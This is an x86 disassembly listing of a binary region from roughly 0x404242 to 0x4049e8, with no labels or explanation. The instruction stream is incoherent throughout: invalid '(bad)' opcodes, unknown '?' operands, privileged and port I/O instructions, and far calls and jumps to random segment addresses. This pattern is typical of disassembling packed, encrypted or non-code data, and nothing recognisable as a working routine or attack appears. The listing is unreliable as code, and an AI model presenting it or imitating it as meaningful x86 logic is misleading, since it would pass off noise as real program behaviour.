  404242:	sbb    edx,DWORD PTR [ecx]
  404244:	imul   esp,DWORD PTR [ecx],0x610c0622
  40424a:	mul    BYTE PTR [ecx]
  40424c:	call   0x6e39:0xe3ef2ccb
  404253:	popa   
  404254:	add    eax,0x8ad4cb3
  404259:	hlt    
  40425a:	cwde   
  40425b:	outs   dx,DWORD PTR ds:[esi]
  40425c:	pop    edi
  40425d:	add    BYTE PTR [eax-0x19],dh
  404260:	test   al,0xa2
  404262:	dec    edi
  404263:	iret   
  404264:	jp     0x404248
  404266:	jmp    0x4042d9
  404268:	or     BYTE PTR [esp+edi*1-0x33a14d09],dh
  40426f:	or     edi,DWORD PTR [ecx-0x7]
  404272:	outs   dx,DWORD PTR ds:[esi]
  404273:	and    esi,0xffffffc8
  404276:	lock mov edx,0xa79d391c
  40427c:	or     al,BYTE PTR [edx]
  40427e:	sub    ebx,DWORD PTR [eax-0x61]
  404281:	imul   edi,DWORD PTR [esi],0xfffffffd
  404284:	cmp    esp,DWORD PTR [edx]
  404286:	mov    ah,0x21
  404288:	xchg   DWORD PTR [ebp-0x41],edx
  40428b:	iret   
  40428c:	retf   
  40428d:	mov    cl,0xb8
  40428f:	xchg   esp,eax
  404290:	mov    ecx,0x61dcde5
  404295:	mov    esp,0x506a3ab3
  40429a:	popa   
  40429b:	dec    esp
  40429c:	(bad)  
  40429d:	retf   0xa316
  4042a0:	fiadd  DWORD PTR [eax+0x7a7ef7e7]
  4042a6:	jne    0x4042be
  4042a8:	sbb    eax,0xffffff80
  4042ab:	in     eax,0x1a
  4042ad:	or     dh,ah
  4042af:	cwde   
  4042b0:	push   ebx
  4042b1:	adc    DWORD PTR [edi-0x628112d9],ebx
  4042b7:	cdq    
  4042b8:	pop    es
  4042b9:	dec    esi
  4042ba:	loope  0x404306
  4042bc:	ds int 0x13
  4042bf:	loop   0x4042fd
  4042c1:	mov    ds:0xbcdbfa9f,al
  4042c6:	jns    0x404270
  4042c8:	repz pop ecx
  4042ca:	fimul  DWORD PTR [ebp-0x11]
  4042cd:	pushf  
  4042ce:	push   eax
  4042cf:	call   0xb39c:0x2262308c
  4042d6:	adc    ch,BYTE PTR [edi+eax*2+0x83e7bc2]
  4042dd:	pop    edx
  4042de:	jns    0x404318
  4042e0:	or     edx,esp
  4042e2:	rcl    al,0xd
  4042e5:	jmp    0x955aca1b
  4042ea:	xchg   ebx,eax
  4042eb:	std    
  4042ec:	or     eax,0x2dd8768d
  4042f1:	enter  0x39d7,0x85
  4042f5:	scas   eax,DWORD PTR es:[edi]
  4042f6:	inc    ebx
  4042f7:	int    0x50
  4042f9:	cdq    
  4042fa:	xchg   edx,eax
  4042fb:	adc    eax,DWORD PTR [eax+0x68c93837]
  404301:	mov    eax,0xd0fc85dd
  404306:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  404308:	pop    edx
  404309:	sub    al,0x7b
  40430b:	pop    esp
  40430c:	arpl   WORD PTR [edi],si
  40430e:	fnstenv [ecx+0x59762df]
  404314:	das    
  404315:	mov    ah,0x97
  404317:	inc    ebp
  404318:	push   esi
  404319:	js     0x40435a
  40431b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40431c:	mov    eax,ds:0xc00e893d
  404321:	xlat   BYTE PTR ds:[ebx]
  404322:	(bad)  
  404323:	icebp  
  404324:	xchg   edi,eax
  404325:	fbstp  TBYTE PTR [ebp-0x71197ec6]
  40432b:	push   ebp
  40432c:	repnz mov bh,0xab
  40432f:	cmp    al,0x61
  404331:	dec    dx
  404333:	js     0x40430c
  404335:	cmp    ebp,DWORD PTR [ecx+0x9]
  404338:	inc    edx
  404339:	(bad)  
  40433a:	fisubr DWORD PTR [edi+edx*2]
  40433d:	dec    edx
  40433e:	nop
  40433f:	daa    
  404340:	xor    edi,DWORD PTR cs:[ebp+eax*8-0x2391112]
  404348:	xchg   BYTE PTR [eax+0x6123da85],al
  40434e:	mov    dh,0xd3
  404350:	lods   eax,DWORD PTR ds:[esi]
  404351:	hlt    
  404352:	adc    esi,esp
  404354:	jl     0x404394
  404356:	test   al,0xa4
  404358:	push   0x53
  40435a:	enter  0x7ccf,0x3c
  40435e:	out    dx,al
  40435f:	fs gs leave 
  404362:	pop    es
  404363:	and    al,0xf5
  404365:	cli    
  404366:	and    edx,0x6d97e7b3
  40436c:	jo     0x40436b
  40436e:	ret    
  40436f:	ja     0x404306
  404371:	inc    edi
  404372:	stos   DWORD PTR es:[edi],eax
  404373:	or     BYTE PTR [edx],0xae
  404376:	cmp    eax,0xead8c809
  40437b:	sbb    DWORD PTR [eax],0x28e5bea0
  404381:	and    ebx,DWORD PTR [edx+ebp*2]
  404384:	cs dec esp
  404386:	loopne 0x4043d2
  404388:	add    al,0xba
  40438a:	pop    edx
  40438b:	cmp    esp,DWORD PTR [ecx]
  40438d:	mov    ebx,0xa7e76e6e
  404392:	nop
  404393:	and    BYTE PTR [esp+edx*4],ah
  404396:	leave  
  404397:	gs cli 
  404399:	mov    dh,0xb5
  40439b:	fnstcw WORD PTR [edx]
  40439d:	aaa    
  40439e:	jno    0x404394
  4043a0:	iret   
  4043a1:	xor    cl,BYTE PTR [edi-0x75291760]
  4043a7:	sahf   
  4043a8:	sti    
  4043a9:	jb     0x4043cf
  4043ab:	mov    ch,0x7d
  4043ad:	dec    ecx
  4043ae:	pusha  
  4043af:	cmp    al,0x5a
  4043b1:	dec    ecx
  4043b2:	loop   0x4043b8
  4043b4:	xchg   esp,eax
  4043b5:	shl    BYTE PTR [ebp+ecx*8-0x112cd251],0x66
  4043bd:	mov    edi,0xbdfbc64f
  4043c2:	stc    
  4043c3:	ficomp WORD PTR [ebp+0x241d30d3]
  4043c9:	push   ebp
  4043ca:	shl    DWORD PTR [edi+0x2fd114ac],1
  4043d0:	jge    0x404378
  4043d2:	pop    ss
  4043d3:	xchg   edi,eax
  4043d4:	ret    
  4043d5:	out    0xe,eax
  4043d7:	out    dx,eax
  4043d8:	jb     0x4043cf
  4043da:	fild   DWORD PTR [si-0x40]
  4043de:	mov    ecx,0x6266e8b3
  4043e3:	adc    eax,0x7bb5bf5c
  4043e8:	cmp    eax,DWORD PTR [eax]
  4043ea:	cmp    edi,DWORD PTR [ecx]
  4043ec:	jge    0xb3bdc5f0
  4043f2:	call   0xad0:0xd9d5f4a7
  4043f9:	sbb    eax,0x6f743ca
  4043fe:	rol    DWORD PTR [edx+0x7b],0x94
  404402:	fnstcw WORD PTR [ebx-0x511567b6]
  404408:	ret    
  404409:	mov    ds:0xcd89f9a7,al
  40440e:	fucom  st(6)
  404410:	fdiv   QWORD PTR [esi-0x3a]
  404413:	loope  0x4043eb
  404415:	(bad)  
  404416:	xlat   BYTE PTR ds:[ebx]
  404417:	enter  0x829e,0x86
  40441b:	ins    DWORD PTR es:[edi],dx
  40441c:	into   
  40441d:	add    al,0xac
  40441f:	fdiv   DWORD PTR [ebx+0x3c]
  404422:	addr16 jp 0x404475
  404425:	jno    0x404457
  404427:	add    eax,0xcd043059
  40442c:	sbb    BYTE PTR [esi-0x3],bh
  40442f:	jmp    0x8e84:0xd11f50a3
  404436:	jge    0x404427
  404438:	lods   eax,DWORD PTR ds:[esi]
  404439:	push   es
  40443a:	mov    bh,0xc7
  40443c:	(bad)  
  40443d:	cli    
  40443e:	iret   
  40443f:	or     al,0xfd
  404441:	ins    DWORD PTR es:[edi],dx
  404442:	fcomp  QWORD PTR [ebx-0x23]
  404445:	in     eax,dx
  404446:	std    
  404447:	rol    DWORD PTR [esi+0x56ed29f3],1
  40444d:	mov    dh,BYTE PTR [edi+0x4edf3bbb]
  404453:	xchg   ebx,eax
  404454:	sub    BYTE PTR [ebx+edi*1-0x56],ah
  404458:	(bad)  
  404459:	cmc    
  40445a:	mov    bh,0xb6
  40445c:	dec    eax
  40445d:	pop    edi
  40445e:	sbb    bl,bl
  404460:	js     0x404412
  404462:	xor    eax,0xc77e20c2
  404467:	add    BYTE PTR [eax-0xb17239b],ch
  40446d:	sub    eax,0x1493c927
  404472:	sub    edx,edx
  404474:	outs   dx,DWORD PTR fs:[esi]
  404476:	test   BYTE PTR [ecx+0x363e98cf],0xbe
  40447d:	mov    ecx,0x314610ee
  404482:	or     al,0xbc
  404484:	in     eax,0x8a
  404486:	cmp    eax,0xaae1736e
  40448b:	(bad)
  40448e:	nop
  40448f:	in     al,0xe
  404491:	ss push ss
  404493:	pop    edx
  404494:	std    
  404495:	outs   dx,BYTE PTR ds:[esi]
  404496:	xchg   ebx,eax
  404497:	xlat   BYTE PTR ds:[ebx]
  404498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404499:	jle    0x404469
  40449b:	loop   0x40450a
  40449d:	xchg   esp,eax
  40449e:	xor    DWORD PTR [ecx],ebx
  4044a0:	jle    0x404499
  4044a2:	shr    DWORD PTR [eax-0x3b134341],0x84
  4044a9:	loop   0x404478
  4044ab:	popf   
  4044ac:	ret    0x28a
  4044af:	mov    dh,0x7a
  4044b1:	call   0xbecb:0x696e3f50
  4044b8:	jl     0x404514
  4044ba:	les    ecx,FWORD PTR [ebx+esi*1-0x60]
  4044be:	and    ebp,DWORD PTR [edx-0x52]
  4044c1:	mov    dl,0x49
  4044c3:	xor    eax,0x612585a
  4044c8:	xchg   bl,al
  4044ca:	jne    0x4044bc
  4044cc:	sub    ebx,ebp
  4044ce:	cmp    cl,BYTE PTR [ebx-0x3e7e8abf]
  4044d4:	cmp    esp,DWORD PTR [ebx+0x2435265f]
  4044da:	jp     0x4044e3
  4044dc:	push   esp
  4044dd:	mov    dh,BYTE PTR [eax+0x7a]
  4044e0:	ds xchg esp,eax
  4044e2:	out    0x54,al
  4044e4:	in     al,dx
  4044e5:	push   esp
  4044e6:	gs addr16 mov eax,0xbf476697
  4044ed:	push   edx
  4044ee:	adc    cl,ch
  4044f0:	fisttp QWORD PTR [esi]
  4044f2:	aam    0xdd
  4044f4:	clc    
  4044f5:	push   ebx
  4044f6:	inc    ebx
  4044f7:	mov    esp,0xc7a26cba
  4044fc:	ficomp DWORD PTR [eax+0x59]
  4044ff:	jecxz  0x404495
  404501:	xchg   ebp,eax
  404502:	adc    al,0xa9
  404504:	lods   al,BYTE PTR ds:[esi]
  404505:	jecxz  0x4044df
  404507:	push   esp
  404508:	cmc    
  404509:	adc    al,0x84
  40450b:	adc    DWORD PTR [edx],ebx
  40450d:	(bad)  
  40450e:	and    eax,0xf6f6fe19
  404513:	inc    edi
  404514:	loopne 0x40457e
  404516:	push   ecx
  404517:	aaa    
  404518:	dec    eax
  404519:	shr    BYTE PTR [ebp+0x79],cl
  40451c:	stos   DWORD PTR es:[edi],eax
  40451d:	les    ebx,FWORD PTR ss:[eax+0x7c1fe33]
  404524:	xchg   ebx,eax
  404525:	pushf  
  404526:	rcl    bl,cl
  404528:	(bad)  
  404529:	xor    eax,0x9cc8ad2c
  40452e:	aaa    
  40452f:	aaa    
  404530:	and    al,BYTE PTR [edi-0x13]
  404533:	pop    esp
  404534:	dec    esi
  404535:	cmp    al,0x77
  404537:	jg     0x4044e0
  404539:	jno    0x40454d
  40453b:	and    ebp,DWORD PTR [edx+0x2c]
  40453e:	sbb    DWORD PTR [edi-0x48],eax
  404541:	xlat   BYTE PTR ds:[ebx]
  404542:	std    
  404543:	retf   
  404544:	or     ecx,DWORD PTR [ecx-0x7dd46350]
  40454a:	(bad)  
  40454b:	ds ret 
  40454d:	dec    edi
  40454e:	out    dx,al
  40454f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404550:	pop    esi
  404551:	(bad)  
  404552:	mov    cl,0xb7
  404554:	jmp    0x6ab3:0xf8a0e230
  40455b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40455c:	push   esp
  40455d:	mov    ds:0x501b3cb8,al
  404562:	aam    0x91
  404564:	in     eax,dx
  404565:	ror    BYTE PTR [edx+0x72],0x59
  404569:	cmp    edi,DWORD PTR [ecx-0x65]
  40456c:	mov    ah,0x16
  40456e:	jle    0x404551
  404570:	popa   
  404571:	xchg   BYTE PTR [ecx-0x6a1e3479],dl
  404577:	test   DWORD PTR [ebx-0x6e],edi
  40457a:	cmp    cl,BYTE PTR [edx+ebp*4]
  40457d:	mov    al,0x8b
  40457f:	or     al,0x36
  404581:	adc    al,0x3c
  404583:	jbe    0x40457e
  404585:	xor    ah,BYTE PTR [ebx]
  404587:	pop    eax
  404588:	mov    edi,0x67aa2736
  40458d:	les    ecx,FWORD PTR [esp+edx*4]
  404590:	jae    0x40456c
  404592:	ret    
  404593:	xchg   edx,eax
  404594:	je     0x4045a4
  404596:	or     eax,0x9aabe3ac
  40459b:	inc    ebx
  40459c:	mov    ds:0x2b323549,al
  4045a1:	hlt    
  4045a2:	ds div cl
  4045a5:	xor    dl,BYTE PTR [edi]
  4045a7:	idiv   BYTE PTR [eax-0x1027c4e8]
  4045ad:	dec    edi
  4045ae:	sub    al,0x0
  4045b0:	shl    BYTE PTR [ecx+0xfeb537b],0xca
  4045b7:	or     eax,0xa87c9d9b
  4045bc:	sub    al,0x8b
  4045be:	push   ebp
  4045bf:	retf   0x4697
  4045c2:	mov    ah,0x8a
  4045c4:	clc    
  4045c5:	or     ah,dl
  4045c7:	inc    ecx
  4045c8:	inc    ebx
  4045c9:	xchg   ecx,eax
  4045ca:	jnp    0x40455d
  4045cc:	cmp    BYTE PTR [esi-0x566cb83e],ch
  4045d2:	push   cs
  4045d3:	out    0xe2,eax
  4045d5:	add    al,ch
  4045d7:	cmp    al,0xad
  4045d9:	lods   al,BYTE PTR ds:[esi]
  4045da:	mov    al,ds:0x1a267e97
  4045df:	xchg   BYTE PTR [esi-0x7],ch
  4045e2:	add    al,0x1
  4045e4:	jp     0x40456c
  4045e6:	into   
  4045e7:	inc    ebx
  4045e8:	outs   dx,BYTE PTR ds:[esi]
  4045e9:	push   ss
  4045ea:	std    
  4045eb:	adc    BYTE PTR [ebp+0x71],dl
  4045ee:	dec    esi
  4045ef:	mov    ecx,0x9e03f333
  4045f4:	mov    cs,WORD PTR fs:[eax+0x68cddc51]
  4045fb:	xchg   ebx,eax
  4045fc:	cmp    dh,ch
  4045fe:	mov    ebx,0x7218941f
  404603:	sub    edx,DWORD PTR [ebx-0x1e]
  404606:	adc    BYTE PTR [edi],bl
  404608:	nop
  404609:	cli    
  40460a:	rcr    DWORD PTR [esi-0x55],cl
  40460d:	add    DWORD PTR [edx],ebx
  40460f:	inc    ebp
  404610:	mov    al,ds:0x6319a91f
  404615:	adc    eax,0x1813e403
  40461a:	imul   DWORD PTR [edi]
  40461c:	es ins DWORD PTR es:[edi],dx
  40461e:	bound  ebp,QWORD PTR [edi+edi*4-0x74]
  404622:	and    bl,0xb7
  404625:	into   
  404626:	iret   
  404627:	jg     0x4045e9
  404629:	test   BYTE PTR [eax+0x37fa0b26],0xe6
  404630:	out    0xe6,al
  404632:	fwait
  404633:	inc    esp
  404634:	inc    esi
  404635:	xchg   ebp,eax
  404636:	clc    
  404637:	jmp    0x223a3f4b
  40463c:	mov    bh,0x21
  40463e:	mov    ch,0x90
  404640:	enter  0x64e9,0x4a
  404644:	call   DWORD PTR [edi]
  404646:	jle    0x4046c0
  404648:	mov    ch,0xaf
  40464a:	out    dx,al
  40464b:	xor    DWORD PTR [ecx],0xffffff9c
  40464e:	sbb    al,0x56
  404650:	xchg   ebx,eax
  404651:	sbb    DWORD PTR [esi+ebx*4-0x7a],0xc8ab0cf7
  404659:	mov    ah,0x48
  40465b:	adc    al,0xf
  40465d:	mov    ebx,0x3f1a5c37
  404662:	fcom   st(5)
  404664:	outs   dx,BYTE PTR ds:[esi]
  404665:	lds    esi,FWORD PTR [esi-0x19]
  404668:	stc    
  404669:	lods   eax,DWORD PTR ds:[esi]
  40466a:	ins    BYTE PTR es:[edi],dx
  40466b:	add    al,0x3e
  40466d:	and    eax,0xa5cc9254
  404672:	enter  0xb701,0xab
  404676:	loop   0x404682
  404678:	cmp    DWORD PTR [ecx],ecx
  40467a:	dec    ebp
  40467c:	jge    0x404696
  40467e:	xor    ch,BYTE PTR [esi+0x11c348dd]
  404684:	dec    edx
  404685:	xor    eax,DWORD PTR [eax]
  404687:	mov    DWORD PTR [ebp+0x588b2746],esp
  40468d:	call   0x8b7f:0xad33aec6
  404694:	dec    edi
  404695:	lahf   
  404696:	mov    cl,0x32
  404698:	and    al,0x38
  40469a:	add    edx,DWORD PTR [esi]
  40469c:	pop    ebx
  40469d:	fisubr DWORD PTR [eax]
  40469f:	pusha  
  4046a0:	cmp    ebp,edx
  4046a2:	aaa    
  4046a3:	mov    BYTE PTR ds:0x213964b7,cl
  4046a9:	and    DWORD PTR [edx-0x5b620374],edi
  4046af:	mov    edx,0x6f0eec64
  4046b4:	cmp    al,0x3e
  4046b6:	loope  0x4046fd
  4046b8:	push   0x1e
  4046ba:	shl    ch,1
  4046bc:	pop    eax
  4046bd:	not    ebx
  4046bf:	inc    edi
  4046c0:	popa   
  4046c1:	adc    ecx,DWORD PTR [esi+0x52]
  4046c4:	jne    0x404733
  4046c6:	jle    0x404727
  4046c8:	jb     0x404748
  4046ca:	mov    esp,0x83e70982
  4046cf:	popa   
  4046d0:	cmp    esp,DWORD PTR [ebx+0x157fefe5]
  4046d6:	cmp    eax,0x4708eda9
  4046db:	and    esp,ebp
  4046dd:	jmp    0x404691
  4046df:	int    0xf1
  4046e1:	mov    dh,0x6
  4046e3:	jo     0x4046e6
  4046e5:	clts   
  4046e7:	imul   ecx,DWORD PTR [esi],0xffffff86
  4046ea:	dec    ecx
  4046eb:	push   es
  4046ec:	xchg   DWORD PTR [ebx],edx
  4046ee:	sub    DWORD PTR [eax+ecx*1],ecx
  4046f1:	jno    0x40475a
  4046f3:	loopne 0x404677
  4046f5:	pop    eax
  4046f6:	pop    es
  4046f7:	sbb    esi,DWORD PTR [ecx]
  4046f9:	popa   
  4046fa:	xlat   BYTE PTR ds:[ebx]
  4046fb:	push   ebp
  4046fc:	sub    ebx,DWORD PTR [edx-0x31db395a]
  404702:	(bad)  
  404703:	cld    
  404704:	mov    edx,0x417a6cc5
  404709:	lods   eax,DWORD PTR ds:[esi]
  40470a:	dec    eax
  40470b:	mov    bh,0x65
  40470d:	gs stos BYTE PTR es:[edi],al
  40470f:	push   0xc825a18
  404714:	ror    DWORD PTR ds:[ecx],0x80
  404718:	test   BYTE PTR [ebp+0x5cef1f4e],0xe7
  40471f:	(bad)  
  404720:	add    edi,DWORD PTR gs:[edi]
  404723:	sub    bh,BYTE PTR ds:0x55a83fc3
  404729:	xor    eax,0xd6d05b28
  40472e:	inc    edx
  40472f:	jecxz  0x40470a
  404731:	push   eax
  404732:	sbb    eax,DWORD PTR [esi]
  404734:	inc    ebp
  404735:	rcr    BYTE PTR [esi-0x7c6493a8],0xa5
  40473c:	cmc    
  40473d:	(bad)  [ecx+edx*2+0x41]
  404741:	or     ebp,DWORD PTR [ecx+0x5b]
  404744:	dec    ecx
  404745:	in     eax,0x9f
  404747:	push   0xffffff8c
  404749:	cmp    al,0x80
  40474b:	push   ebp
  40474c:	push   es
  40474d:	ja     0x4046fe
  40474f:	fdivr  st,st(7)
  404751:	sbb    DWORD PTR [esi],edi
  404753:	jnp    0x4047b2
  404755:	jle    0x4046e3
  404757:	xor    BYTE PTR [eax-0x78],0x42
  40475b:	dec    edi
  40475c:	dec    esi
  40475d:	add    al,0xd
  40475f:	les    esi,FWORD PTR [eax-0x53]
  404762:	mov    ah,0xa4
  404764:	xchg   edi,eax
  404765:	sbb    DWORD PTR [edi-0x11],edi
  404768:	push   0x4e824def
  40476d:	pop    edx
  40476e:	add    cl,dh
  404770:	xor    eax,0x31e42021
  404775:	out    0x57,eax
  404777:	push   0x6c2235
  40477c:	pop    ebx
  40477d:	mov    ah,0xed
  40477f:	adc    BYTE PTR [eax],cl
  404781:	fsub   DWORD PTR [edi-0x186afac9]
  404787:	jmp    0x40473f
  404789:	mov    eax,ds:0x9636555a
  40478e:	cdq    
  40478f:	jg     0x404719
  404791:	jnp    0x4047c5
  404793:	ret    0xd8b8
  404796:	push   edx
  404797:	iret   
  404798:	pop    ebp
  404799:	(bad)  
  40479a:	dec    ecx
  40479b:	inc    edx
  40479c:	mov    ?,ecx
  40479e:	mov    al,0x9c
  4047a0:	jb     0x40481a
  4047a2:	xchg   ebp,eax
  4047a3:	pop    ecx
  4047a4:	es cmp eax,eax
  4047a7:	ror    DWORD PTR [ecx+0x11],1
  4047aa:	mov    eax,ds:0x95ff89c0
  4047af:	xchg   ebx,eax
  4047b0:	or     eax,DWORD PTR [ebx-0x12bc0732]
  4047b6:	mov    bh,0x7f
  4047b8:	ss push cs
  4047ba:	popa   
  4047bb:	arpl   WORD PTR [eax-0x3140d93a],sp
  4047c1:	inc    ecx
  4047c2:	cli    
  4047c3:	outs   dx,BYTE PTR ds:[esi]
  4047c4:	cli    
  4047c5:	test   DWORD PTR [edi],esi
  4047c7:	sbb    eax,eax
  4047c9:	xor    BYTE PTR [ebx+0x6a],ah
  4047cc:	cli    
  4047cd:	xchg   ebx,eax
  4047ce:	inc    ebp
  4047cf:	push   edx
  4047d0:	mov    esp,0x6ca81dc1
  4047d6:	or     ebx,esp
  4047d8:	inc    esp
  4047d9:	sub    BYTE PTR [edx-0x12],bl
  4047dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047dd:	daa    
  4047de:	cmp    edx,DWORD PTR [edx+0x4e]
  4047e1:	sar    BYTE PTR [edx+esi*2+0x7],0x1a
  4047e6:	lahf   
  4047e7:	inc    edi
  4047e8:	pop    edx
  4047e9:	ins    BYTE PTR es:[edi],dx
  4047ea:	cdq    
  4047eb:	in     eax,0x74
  4047ed:	(bad)  
  4047ee:	std    
  4047ef:	pop    ss
  4047f0:	nop
  4047f1:	inc    ebx
  4047f2:	test   al,0x8
  4047f4:	fwait
  4047f5:	scas   eax,DWORD PTR es:[edi]
  4047f6:	pop    esp
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	lock jo 0x404875
  4047fb:	cmp    esp,DWORD PTR [ebp-0x7f]
  4047fe:	pop    eax
  4047ff:	push   ss
  404800:	repnz ins DWORD PTR es:[edi],dx
  404802:	imul   edi,DWORD PTR [edi],0xffffffb9
  404805:	add    dl,0x53
  404808:	(bad)  
  404809:	mov    ds:0x66f9a2ff,al
  40480e:	xchg   edi,eax
  40480f:	mov    ecx,0x8ed054d8
  404814:	cld    
  404815:	adc    edi,ebx
  404817:	bound  eax,QWORD PTR [edi-0x5c]
  40481a:	cwde   
  40481b:	das    
  40481c:	mov    ch,0x76
  40481e:	daa    
  40481f:	pop    ds
  404820:	ret    0xc8bd
  404823:	sahf   
  404824:	xchg   edi,eax
  404825:	push   eax
  404826:	xchg   esi,eax
  404827:	ja     0x4047b0
  404829:	(bad)  
  40482a:	in     al,0xb
  40482c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40482d:	cmp    eax,0xc46a2bca
  404832:	inc    ecx
  404833:	sbb    al,0x63
  404835:	cmp    DWORD PTR [ebp-0x49686163],edx
  40483b:	(bad)  
  40483e:	mov    ecx,0x9805e078
  404843:	mov    esp,0x4789d64f
  404848:	xor    DWORD PTR ds:0x685214a0,0xffffffaf
  40484f:	cmp    ecx,DWORD PTR [edi+0x71]
  404852:	mov    bh,0x5f
  404854:	jecxz  0x4048be
  404856:	push   esi
  404857:	fcmove st,st(7)
  404859:	mov    WORD PTR [ecx],es
  40485b:	jg     0x40486e
  40485d:	jg     0x404876
  40485f:	stos   BYTE PTR es:[edi],al
  404860:	mov    bh,ah
  404862:	push   ds
  404863:	ins    DWORD PTR es:[edi],dx
  404864:	sub    cl,ah
  404866:	pop    edi
  404867:	push   0xffffffd4
  404869:	jmp    0x251b:0x8db21000
  404870:	pusha  
  404871:	dec    eax
  404872:	pop    edi
  404873:	sbb    dh,BYTE PTR [esi+esi*1-0x6fae436d]
  40487a:	or     DWORD PTR [ebp+0x57f771a0],eax
  404880:	mov    edi,0x91eda142
  404885:	ins    DWORD PTR es:[edi],dx
  404886:	mov    ch,0x19
  404888:	cdq    
  404889:	xchg   edi,eax
  40488a:	shl    edx,cl
  40488c:	mov    bl,0x11
  40488e:	push   esp
  40488f:	cwde   
  404890:	push   edx
  404891:	pop    es
  404892:	int3   
  404893:	dec    eax
  404894:	nop
  404895:	data16 jne 0x4048e4
  404898:	or     al,0xb2
  40489a:	xchg   DWORD PTR [edx-0x24af217],ebx
  4048a0:	pop    ss
  4048a1:	scas   eax,DWORD PTR es:[edi]
  4048a2:	xchg   ebx,eax
  4048a3:	sti    
  4048a4:	sbb    eax,0xac33dd9e
  4048a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048aa:	add    esp,0xccf7c11c
  4048b0:	stos   DWORD PTR es:[edi],eax
  4048b1:	xlat   BYTE PTR ds:[ebx]
  4048b2:	sub    BYTE PTR [ebx],0xf6
  4048b5:	add    al,0x75
  4048b7:	adc    esi,DWORD PTR [edx-0x73af12d6]
  4048bd:	lds    edi,FWORD PTR [eax]
  4048bf:	jl     0x40492c
  4048c1:	nop
  4048c2:	mov    cl,0xe3
  4048c4:	lods   eax,DWORD PTR ds:[esi]
  4048c5:	je     0x40493f
  4048c7:	retf   0x9253
  4048ca:	jbe    0x4048e3
  4048cc:	sti    
  4048cd:	fimul  DWORD PTR [edx+0x2e13bc3c]
  4048d3:	fisub  DWORD PTR [esi+edx*1]
  4048d6:	fisubr DWORD PTR [esi-0x1f0eae18]
  4048dc:	pop    ebp
  4048dd:	mov    eax,0x81aa3acb
  4048e2:	cmp    esi,DWORD PTR [edi-0x31]
  4048e5:	or     DWORD PTR [ecx],eax
  4048e7:	clc    
  4048e8:	test   eax,0x74c53810
  4048ed:	pusha  
  4048ee:	shl    BYTE PTR [ecx-0x5e5bb233],cl
  4048f4:	imul   eax,DWORD PTR [esi-0x3f],0x2fab9b76
  4048fb:	xor    DWORD PTR [edi-0x5b],edi
  4048fe:	pop    esi
  4048ff:	inc    edi
  404900:	enter  0xc57d,0x84
  404904:	jb     0x4048a7
  404906:	(bad)  
  404907:	cmp    eax,0xa965b4e
  40490c:	daa    
  40490d:	cld    
  40490e:	push   ecx
  40490f:	pushf  
  404910:	ds jg  0x4048d2
  404913:	retf   
  404914:	pop    edx
  404915:	pop    eax
  404916:	inc    edi
  404917:	push   0x37
  404919:	mov    ah,0xf7
  40491b:	fcomp  st(1)
  40491d:	stos   BYTE PTR es:[edi],al
  40491e:	int    0xcf
  404920:	stc    
  404921:	in     eax,dx
  404922:	iret   
  404923:	dec    DWORD PTR [ecx]
  404925:	push   ebx
  404926:	push   edi
  404927:	repz test al,0xe5
  40492a:	mov    ?,WORD PTR [esi+0x7d]
  40492d:	add    dh,BYTE PTR [esi]
  40492f:	cwde   
  404930:	push   esp
  404931:	adc    bh,dh
  404933:	cwde   
  404934:	pushf  
  404935:	inc    DWORD PTR [eax]
  404937:	sub    BYTE PTR [esp+edi*2-0x17946bdf],0xa8
  40493f:	mov    ds:0x8959fd1f,eax
  404944:	call   0x7e6cdfab
  404949:	mov    al,ds:0x619d7d62
  40494e:	pop    ebx
  40494f:	ret    
  404950:	cmp    bl,dl
  404952:	add    DWORD PTR [eax-0x5f],eax
  404955:	push   ebp
  404956:	and    eax,0x8a544fb
  40495b:	(bad)  
  40495c:	pop    edi
  40495d:	mov    cl,0x25
  40495f:	pop    esi
  404960:	mov    esp,0x691c5e30
  404965:	mov    al,ds:0x7e38260d
  40496a:	xchg   esi,eax
  40496b:	call   0xb412:0x8a959703
  404972:	pop    esi
  404973:	retfw  
  404975:	stos   DWORD PTR es:[edi],eax
  404976:	xchg   esi,eax
  404977:	daa    
  404978:	push   DWORD PTR [esi]
  40497a:	(bad)
  40497e:	mov    ch,0x5d
  404980:	xchg   esi,eax
  404981:	push   ds
  404982:	daa    
  404983:	add    BYTE PTR [eax+eax*8+0x67],ch
  404987:	vaddpd xmm7,xmm6,xmm2
  40498b:	sub    DWORD PTR [eax+0x2f8abd5d],edx
  404991:	iret   
  404992:	aas    
  404993:	xor    ebp,DWORD PTR [edi+0x13]
  404996:	mov    ?,ebx
  404998:	inc    DWORD PTR [ecx-0x32]
  40499b:	fcomp  DWORD PTR [ebx+eiz*1+0x17]
  40499f:	rcr    eax,1
  4049a1:	mov    ah,0xc8
  4049a3:	inc    esp
  4049a4:	test   al,0xc8
  4049a6:	retf   0x8fd9
  4049a9:	sahf   
  4049aa:	test   dh,ch
  4049ac:	in     eax,0xbd
  4049ae:	adc    al,0x75
  4049b0:	jmp    0x404909e9
  4049b5:	(bad)  
  4049b6:	cld    
  4049b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b8:	jbe    0x404972
  4049ba:	and    al,0xf6
  4049bc:	push   edx
  4049bd:	xchg   edx,eax
  4049be:	dec    ecx
  4049bf:	aas    
  4049c0:	xchg   edx,eax
  4049c1:	adc    ch,BYTE PTR [esi]
  4049c3:	fwait
  4049c4:	mov    cl,bl
  4049c6:	sub    ebx,DWORD PTR [edi-0x4d]
  4049c9:	loop   0x404a33
  4049cb:	sub    BYTE PTR [esi],ah
  4049cd:	(bad)  
  4049ce:	out    dx,al
  4049cf:	xchg   ecx,eax
  4049d0:	sahf   
  4049d1:	rol    BYTE PTR [eax+0x21],cl
  4049d4:	xchg   edx,edi
  4049d6:	mov    dh,0xac
  4049d8:	fnstsw WORD PTR [ecx+0x1c]
  4049db:	xchg   ecx,eax
  4049dc:	dec    ebx
  4049dd:	cmp    edi,eax
  4049df:	dec    ebx
  4049e0:	arpl   WORD PTR [eax],di
  4049e2:	pop    eax
  4049e3:	mov    ebp,0xdff4e6e4
  4049e8:	xlat   BYTE PTR ds:[ebx]
